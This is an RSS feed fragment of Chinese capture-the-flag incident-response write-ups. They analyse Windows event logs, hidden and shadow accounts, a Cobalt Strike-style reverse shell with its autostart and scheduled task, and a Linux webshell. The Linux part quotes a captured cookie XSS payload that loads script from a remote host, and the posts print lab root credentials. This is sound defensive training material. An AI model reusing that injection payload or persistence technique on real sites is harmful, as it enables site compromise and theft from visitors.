&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2&lt;/h2>
&lt;ol start="2">
&lt;li>&lt;strong>审计相关日志，提交rdp被爆破失败次数&lt;/strong>&lt;br>
Win+R打开，eventvwr.msc&lt;br>
打开日志：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321204216.png" alt="Pasted image 20250321204216">&lt;br>
然后根据要求进行筛选，事件ID为4625，可以看到登录失败次数为2594次&lt;br>
&lt;strong>登录失败日志ID为4625&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321205126.png" alt="Pasted image 20250321205126">&lt;br>
也可以使用工具进行查看&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321210158.png" alt="Pasted image 20250321210158">&lt;br>
flag&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{2594}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3&lt;/h2>
&lt;ol start="3">
&lt;li>&lt;strong>审计相关日志，提交成功登录rdp的远程IP地址，多个以&amp;amp;连接,以从小到大顺序排序提交&lt;/strong>&lt;br>
事件ID筛选为4648，表示用使用凭据登录&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321211501.png" alt="Pasted image 20250321211501">&lt;br>
然后到处文件，放FullEventLogView软件中&lt;br>
找到一个&lt;strong>192.168.150.1&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321211545.png" alt="Pasted image 20250321211545">&lt;br>
第二个：&lt;strong>192.168.150.128&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321211621.png" alt="Pasted image 20250321211621">&lt;br>
第三个：&lt;strong>192.168.150.178&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321211652.png" alt="Pasted image 20250321211652">&lt;br>
flag:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.150.1&amp;amp;192.168.150.128&amp;amp;192.168.150.178}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag4">flag4&lt;/h2>
&lt;ol start="4">
&lt;li>&lt;strong>提交黑客创建的隐藏账号&lt;/strong>&lt;br>
关于隐藏账号在用户组中可以查看到，快捷键WIN+R输入 &amp;lsquo;&lt;strong>lusrmgr.msc&lt;/strong>&amp;rsquo;，看到用户中hacker$以及属性及所属的组&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321212302.png" alt="Pasted image 20250321212302">&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{hacker$}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag5">flag5&lt;/h2>
&lt;ol start="5">
&lt;li>&lt;strong>提交黑客创建的影子账号&lt;/strong>&lt;br>
影子账号真实环境中是无法在用户组/netuser/用户面板中看到，但是可以在注册表中看到并删除，快捷键WIN+R &amp;lsquo;&lt;strong>regedit&lt;/strong>&amp;rsquo;&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">注册表地址：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>下图为&lt;code>hackers$&lt;/code>对应的权限值/组信息/映射关系及用户相关目录，操作删除后将不存在此用户信息&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321212524.png" alt="Pasted image 20250321212524">&lt;br>
或者直接使用D盾即可&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321212752.png" alt="Pasted image 20250321212752">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{hackers$}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag6">flag6&lt;/h2>
&lt;ol start="5">
&lt;li>&lt;strong>提交远程shell程序的连接IP+端口，以IP:port方式提交&lt;/strong>&lt;br>
在应急响应中应排查对外连接，这一步是必不可少的，使用netstat -nao查看到相应的端口状态，在后面看到可疑连接&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321213718.png" alt="Pasted image 20250321213718">&lt;br>
由内对外连接，可拿着这个IP去查询到地区为国外的IP，如果说你没看到这个对外连接，说明连接超时了，因为对方本身就没开放这个端口，可重启环境后再次查看到，本身就为了模拟哈&lt;br>
玄机包括实战中可看到不少的对外连接，这时候怎么排查呢，以玄机为例&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321213406.png" alt="Pasted image 20250321213406">&lt;br>
可看到对外连接不少的互联网IP，排查思路如下&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1. 根据外联IP地址进行排查，在情报平台进行查询
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2. 根据端口进行排查，通常大端口或有特殊意义端口要确认
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. 依次根据PID进行排查，这个下面会讲到
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{185.117.118.21:4444}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag7">flag7&lt;/h2>
&lt;p>各位应该发现了，开机就外联了，这个时候我们应该联想到自启动，一般排查以下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1. C:\Users\winlog\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">快捷命令：WIN+R shell:startup 将预自启动程序放入目录，会自启
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">注册表自启动：快捷键：WIN+R regedit 将绝对路径下程序进行字符串值保存会开机自启
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">搜索计划任务，进入任务计划程序，查看相关启动程序
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>当然了，在排查这些之前，我们需要知道在跑的程序是哪个，已知PID为&lt;strong>3676&lt;/strong>(&lt;strong>注意：此处如果突然没有外连，则是超时，需重启环境，这个没办法，不能做到真上线&lt;/strong>)&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321214034.png" alt="Pasted image 20250321214034">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">tasklist | findstr &amp;#34;3676&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用以上命令查看到启动的文件为xiaowei.exe，但是不知道绝对路径如何处置&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321213835.png" alt="Pasted image 20250321213835">&lt;br>
通过以上命令可获取PID的执行文件绝对路径，看到目录在&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">wmic process get name,executablepath,processid | findstr 3676
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里不知道为什么恶意软件断了，&lt;strong>PID也变了，打的时候换成自己查到的PID即可&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321214749.png" alt="Pasted image 20250321214749">&lt;br>
绝对路径为：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\Windows\system64\systemWo\xiaowei&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>当然了，我们也可以使用 &lt;strong>netstat -naob&lt;/strong>查看进程的启动程序和端口，记得用管理员CMD才行。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215047.png" alt="Pasted image 20250321215047">&lt;br>
但是如需查看绝对路径的话还是按照上方方法，这里只是提供多一个方法排查参考&lt;br>
此时，我们继续按照上面思路排查自启动问题，看到自启动方法为注册表开机自启&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215129.png" alt="Pasted image 20250321215129">&lt;br>
将xiaowei.exe文件拖出来，拿到ida或者微步沙箱去看一下，明显的木马特征和Cobalt特征&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215333.png" alt="Pasted image 20250321215333">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215327.png" alt="Pasted image 20250321215327">包括到最后面的网络行为特征也能看到外联IP地址、&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215458.png" alt="Pasted image 20250321215458">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{xiaowei.exe}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag8">flag8&lt;/h2>
&lt;ol start="8">
&lt;li>&lt;strong>黑客使用了计划任务来定时执行某shell程序，提交此程序名字&lt;/strong>&lt;br>
上面已经说了关于计划任务的一些排查思路，按照实战中，攻击队或黑客为了权限维持，不会只放一个远控工具，一般会埋雷进行启动计划任务，根据上方思路排查到，计划任务程序中存在的计划&lt;br>
使用compmgmt.msc打开计算机管理&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215855.png" alt="Pasted image 20250321215855">&lt;br>
然后查看任务计划程序&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321215925.png" alt="Pasted image 20250321215925">&lt;br>
可以看出触发时间&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321220004.png" alt="Pasted image 20250321220004">&lt;br>
点进去查看执行的程序，可看到执行绝对路径&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321220047.png" alt="Pasted image 20250321220047">&lt;br>
查看这个bat脚本，最后得到执行全过程，确认下载了xiaowei.exe文件到相关目录，最后每次开机自启xiaowei.exe文件上线&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250321220204.png" alt="Pasted image 20250321220204">&lt;br>
flag:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">download&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bat&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第五章 linux实战-黑链</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/</guid><description>&lt;img src="http://localhost:1313/images/45.webp" alt="Featured image of post 【玄机靶场】第五章 linux实战-黑链" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>服务器场景操作系统 Linux&lt;br>
服务器账号密码 root xjty110pora 端口 2222&lt;br>
任务环境说明&lt;br>
注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！&lt;br>
应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>文件拉出来分析：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402092201.png" alt="Pasted image 20250402092201">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{header.php}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}&lt;/strong>&lt;br>
直接使用D盾进行扫描即可！&lt;br>
扫描出来一个一个分析一下。发现404.php为后门文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402092553.png" alt="Pasted image 20250402092553">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402092532.png" alt="Pasted image 20250402092532">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">themes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">default&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">404.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>黑客注入黑链文件的 md5 md5sum file flag{md5}&lt;/strong>&lt;br>
D盾扫描出来的pool.js文件也很可疑&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402093130.png" alt="Pasted image 20250402093130">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402093239.png" alt="Pasted image 20250402093239">&lt;br>
确定poc1.js为黑链文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">PS D:\html&amp;gt; certutil -hashfile .\poc1.js MD5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402093103.png" alt="Pasted image 20250402093103">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{10c18029294fdec7b6ddab76d9367c14}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}&lt;/strong>&lt;br>
分析流量包&lt;br>
在 Wireshark 的过滤器中输入 &lt;code>http&lt;/code> 以过滤出所有 HTTP 请求和响应。这将使我们能够专注于与 Web 流量相关的数据包，当然这里也可以直接尝试定位文件“poc1.js”，因为题三我们已经找到了黑客注入的文件是“poc1.js”，所以我们可以尝试查找一下相关的数据包；&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http contains &amp;#34;poc1.js&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094329.png" alt="Pasted image 20250402094329">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094338.png" alt="Pasted image 20250402094338">&lt;br>
那我们右键追踪http进行分析；&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094353.png" alt="Pasted image 20250402094353">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> Cookie: 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_url=http%3A%2F%2Fxxx.xxx.com%2F%22%3E%3C%2Fa%3E%3Cscript%2Fsrc%3Dhttp%3A%2F%2F192.168.20.130%2Fpoc.js%3E%3C%2Fscript%3E%3Ca%2Fhref%3D%22%23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里的 Cookie 包含了一段注入的 JavaScript 代码，显然是黑链攻击的一部分。&lt;br>
url解码为：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094431.png" alt="Pasted image 20250402094431">&lt;br>
请求和响应中包含的信息表明&lt;code>http://192.168.20.130/index.php/archives/1/&lt;/code>页面是黑链攻击的入口，通过Cookie注入的JavaScript代码引入了&lt;code>poc1.js&lt;/code>文件，从而执行了恶意操作。这个URL是反弹的&lt;code>poc1.js&lt;/code>的原因在于其作为恶意代码的载体和入口。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{/index.php/archives/1/}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第五章 Windows 实战-evtx文件分析</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-evtx%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-evtx%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</guid><description>&lt;img src="http://localhost:1313/images/46.webp" alt="Featured image of post 【玄机靶场】第五章 Windows 实战-evtx文件分析" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>点击下载附件获取附件&lt;br>
任务环境说明&lt;br>
注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！&lt;br>
应急响应工程师在收到设备告警后，在受到攻击的服务器保存了一份log 请你协助分析 LOG 文件提交对应的 FLAG。&lt;/p>
&lt;h1 id="靶场">靶场&lt;/h1>
&lt;p>三个日志文件进行分析：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320094426.png" alt="Pasted image 20250320094426">&lt;/p>
&lt;h1 id="过程">过程&lt;/h1>
&lt;h2 id="flag1">flag1&lt;/h2>
&lt;p>&lt;strong>1.将黑客成功登录系统所使用的IP地址作为Flag值提交；&lt;/strong>&lt;br>
查看登录成功事件(ID:4624)&lt;br>
点击筛选事件ID 4624即可；&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320111846.png" alt="Pasted image 20250320111846">&lt;br>
&lt;strong>flag:&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.36.133}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2&lt;/h2>
&lt;p>&lt;strong>2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；&lt;/strong>&lt;br>
&lt;strong>事件 ID&lt;/strong>: 4738&lt;br>
直接事件查看器即可查看&lt;br>
